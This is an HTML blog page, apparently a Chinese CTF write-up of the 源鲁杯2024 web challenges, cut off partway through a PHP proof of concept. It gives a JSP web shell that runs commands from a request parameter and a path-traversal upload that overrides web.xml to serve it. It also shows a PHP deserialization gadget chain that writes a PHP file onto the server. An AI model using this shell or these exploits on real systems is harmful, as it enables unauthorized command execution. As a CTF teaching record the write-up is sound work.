@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="TOXEC就是让你上传文件，但是是java的网站，因此可上传jsp回显马。 思路：由于不让上传jsp文件，可先上传一个xml的文件，文件内容是jsp回显马，然后再上传web.xml进行覆盖，解析xml为jsp。 注意两次的上传路径： 12filename&#x3D;&quot;..&#x2F;WEB-INF&#x2F;shell.xml&quot;filename&#x3D;&quot;..&#x2F;WEB-INF&#x2F;web.xml&quot;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="源鲁杯2024web复现">
+<meta property="og:url" content="http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="K1ato&#39;s blog">
+<meta property="og:description" content="TOXEC就是让你上传文件，但是是java的网站，因此可上传jsp回显马。 思路：由于不让上传jsp文件，可先上传一个xml的文件，文件内容是jsp回显马，然后再上传web.xml进行覆盖，解析xml为jsp。 注意两次的上传路径： 12filename&#x3D;&quot;..&#x2F;WEB-INF&#x2F;shell.xml&quot;filename&#x3D;&quot;..&#x2F;WEB-INF&#x2F;web.xml&quot;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-10-19T08:06:29.000Z">
+<meta property="article:modified_time" content="2024-11-01T07:08:13.753Z">
+<meta property="article:author" content="k1ato">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>源鲁杯2024web复现</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/10/20/%E6%8F%90%E6%9D%83%E9%82%A3%E4%BA%9B%E4%BA%8B/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/10/11/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E7%AF%87/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/&text=源鲁杯2024web复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/&title=源鲁杯2024web复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/&is_video=false&description=源鲁杯2024web复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=源鲁杯2024web复现&body=Check out this article: http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/&title=源鲁杯2024web复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/&title=源鲁杯2024web复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/&title=源鲁杯2024web复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/&title=源鲁杯2024web复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/&name=源鲁杯2024web复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/10/19/%E6%BA%90%E9%B2%81%E6%9D%AF2024web%E5%A4%8D%E7%8E%B0/&t=源鲁杯2024web复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#TOXEC"><span class="toc-number">1.</span> <span class="toc-text">TOXEC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pExpl"><span class="toc-number">2.</span> <span class="toc-text">pExpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shxpl"><span class="toc-number">3.</span> <span class="toc-text">shxpl</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        源鲁杯2024web复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">k1ato</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-10-19T08:06:29.000Z" class="dt-published" itemprop="datePublished">2024-10-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="TOXEC"><a href="#TOXEC" class="headerlink" title="TOXEC"></a>TOXEC</h3><p>就是让你上传文件，但是是java的网站，因此可上传jsp回显马。</p>
+<p>思路：由于不让上传jsp文件，可先上传一个xml的文件，文件内容是jsp回显马，然后再上传web.xml进行覆盖，解析xml为jsp。</p>
+<p>注意两次的上传路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;../WEB-INF/shell.xml&quot;</span><br><span class="line">filename=&quot;../WEB-INF/web.xml&quot;</span><br></pre></td></tr></table></figure>
+
+<p>jsp回显马：</p>
+<p>shell.xml:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="literal">null</span>)&#123;  </span><br><span class="line">    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();  </span><br><span class="line">    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;  </span><br><span class="line">    <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];  </span><br><span class="line">    out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);  </span><br><span class="line">    <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;  </span><br><span class="line">        out.print(<span class="keyword">new</span> <span class="title class_">String</span>(b));  </span><br><span class="line">    &#125;  </span><br><span class="line">    out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传的web.xml:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;web-app xmlns=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="line">        xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">        xsi:schemaLocation=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span> version=<span class="string">&quot;4.0&quot;</span>&gt;</span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;exec&lt;/servlet-name&gt;</span><br><span class="line">        &lt;jsp-file&gt;/WEB-INF/shell.xml&lt;/jsp-file&gt;</span><br><span class="line">        &lt;load-on-startup&gt;<span class="number">1</span>&lt;/load-on-startup&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;exec&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/exec&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
+
+<p>之后访问exec路径即可。</p>
+<h3 id="pExpl"><a href="#pExpl" class="headerlink" title="pExpl"></a>pExpl</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fileHandle</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fileName</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$fileName</span>, <span class="variable">$mode</span> = <span class="string">&#x27;r&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fileName = <span class="variable">$fileName</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fileHandle = <span class="title function_ invoke__">fopen</span>(<span class="variable">$fileName</span>, <span class="variable">$mode</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;fileHandle) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Unable to open file: <span class="subst">$fileName</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File opened: <span class="subst">$fileName</span>\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readLine</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$this</span>-&gt;fileHandle);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeLine</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;fileHandle, <span class="variable">$data</span> . PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;fileName) &amp;&amp;!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;fileHandle)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;fileHandle);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;File closed: <span class="subst">&#123;$this-&gt;fileName&#125;</span>\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$userData</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name</span> == <span class="string">&#x27;password&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">password_hash</span>(<span class="variable">$value</span>, PASSWORD_DEFAULT);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;userData[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;userData[<span class="variable">$name</span>] ?? <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;params) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;data) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$this</span>-&gt;data) &gt; <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;data,<span class="variable">$this</span>-&gt;params);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;userData[<span class="variable">$name</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logFile</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lastEntry</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logFile</span> = <span class="string">&#x27;application.log&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logFile = <span class="variable">$logFile</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$level</span>, <span class="variable">$message</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lastEntry = <span class="string">&quot;[&quot;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>) . <span class="string">&quot;] [<span class="subst">$level</span>] <span class="subst">$message</span>&quot;</span> . PHP_EOL;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;logFile, <span class="variable">$this</span>-&gt;lastEntry, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setLogFile</span>(<span class="params"><span class="variable">$logFile</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logFile = <span class="variable">$logFile</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearOldLogs</span>(<span class="params"><span class="variable">$daysToKeep</span> = <span class="number">30</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$files</span> = <span class="title function_ invoke__">glob</span>(<span class="string">&quot;*.log&quot;</span>);</span><br><span class="line">        <span class="variable">$now</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$now</span> - <span class="title function_ invoke__">filemtime</span>(<span class="variable">$file</span>) &gt;= <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="variable">$daysToKeep</span>) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$validLevels</span> = [<span class="string">&#x27;info&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>, <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;debug&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$name</span>, <span class="variable">$validLevels</span>)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="title function_ invoke__">strtoupper</span>(<span class="variable">$name</span>), <span class="variable">$arguments</span>[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Invalid log level: <span class="subst">$name</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$message</span>, <span class="variable">$level</span> = <span class="string">&#x27;INFO&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="variable">$level</span>, <span class="variable">$message</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?php/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$exp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Test!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>链子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FileHandler#__destruct</span><br><span class="line">	User#__toString</span><br><span class="line">		Logger#__call</span><br><span class="line">			Logger#log</span><br></pre></td></tr></table></figure>
+
+<p>poc:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$fileHandle</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$fileName</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$fileName</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;fileName = <span class="variable">$fileName</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$userData</span> = [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$logFile</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$lastEntry</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logFile</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;logFile = <span class="variable">$logFile</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Logger</span>(<span class="string">&quot;/var/www/html/1.php&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;data = [<span class="variable">$c</span>,<span class="string">&quot;info&quot;</span>];</span><br><span class="line"><span class="variable">$b</span>-&gt;params = <span class="string">&quot;&lt;?=phpinfo()?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$a1</span> = <span class="keyword">array</span>(<span class="variable">$a</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a1</span>);</span><br><span 